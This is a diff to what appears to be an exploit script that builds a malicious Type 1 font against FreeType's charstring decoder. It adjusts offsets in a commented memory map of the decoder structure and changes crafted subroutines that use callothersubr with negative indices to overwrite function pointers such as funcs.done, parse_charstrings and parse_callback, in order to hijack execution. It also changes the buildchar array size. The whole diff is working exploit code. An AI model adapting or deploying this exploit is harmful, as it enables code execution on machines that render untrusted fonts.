@@ -1,21 +1,21 @@
 # 0    0x70: stack
 # 256 0x470: top
 # ...
-# 336 0x5b4: ?
-# 337 0x5b8: blend
-# 338 0x5bc: hint_mode
-# 339 0x5c0: parse_callback
-# 340 0x5c4: funcs.init
-# 341 0x5c8: funcs.done
-# 342 0x5cc: funcs.parse_charstrings = t1_decoder_parse_charstrings
-# 343 0x5d0: buildchar = <heap>
-# 344 0x5d4: len_buildchar = 3
-# 345 0x5d8: seac = 0
-# 346 0x5dc: ?
-# 347 0x5e0: ? = 0x208
-# 348 0x5e4: ? = 0
-# 349 0x5e8: ? = 0
-# 350 0x5ec: ? = t1_driver_class
+# 337 0x5b4: ?
+# 338 0x5b8: blend
+# 339 0x5bc: hint_mode
+# 340 0x5c0: parse_callback
+# 341 0x5c4: funcs.init
+# 342 0x5c8: funcs.done
+# 343 0x5cc: funcs.parse_charstrings = t1_decoder_parse_charstrings
+# 344 0x5d0: buildchar = <heap>
+# 345 0x5d4: len_buildchar = 3
+# 346 0x5d8: seac = 0
+# 347 0x5dc: ?
+# 348 0x5e0: ? = 0x208
+# 349 0x5e4: ? = 0
+# 350 0x5e8: ? = 0
+# 351 0x5ec: ? = t1_driver_class
 
 # first overwrite funcs.done and funcs.parse_charstrings using end flex
 # then use THAT to overwrite hint_mode and parse_callback
@@ -51,7 +51,7 @@ subrs[3] = '2 callsubr callsubr ' + 'hstem3 '*14 + '250 42 callothersubr return'
 
 # the first run up
 subrs[4] = '''3 0 setcurrentpoint
-              -346 42 callothersubr
+              -347 42 callothersubr
               callothersubr % now at 341; we could pop pop but that's useless, we need a new location first
               hmoveto
               setcurrentpoint
@@ -97,7 +97,7 @@ main += '''callsubr         % call the selected subr (which should push stuff, s
 
 subrs['main'] = main
 
-num_bca = 3
+num_bca = 3 << 16 + 1
 
 template = open('dejavu.raw.template').read()
 template = template.replace('%BCA%', ('0 ' * num_bca)[:-1])
